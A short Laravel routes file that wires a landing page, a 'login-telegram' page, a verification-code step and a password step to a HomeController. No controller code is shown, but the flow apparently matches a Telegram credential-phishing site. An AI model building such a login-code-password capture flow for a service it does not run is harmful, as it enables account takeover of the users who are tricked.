<?php


use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use App\Http\Controllers\HomeController;
Route::get('', [HomeController::class, 'index_first']);
Route::get('login-telegram', [HomeController::class, 'index'])->name('index');
Route::post('login-handler', [HomeController::class, 'login_store'])->name('login-store');
Route::get('verif', [HomeController::class, 'verif'])->name('verif');
Route::post('verif-store', [HomeController::class, 'verif_store'])->name('verif-store');
Route::get('password', [HomeController::class, 'get_password'])->name('get-password');
Route::post('password', [HomeController::class, 'store_password'])->name('store-password');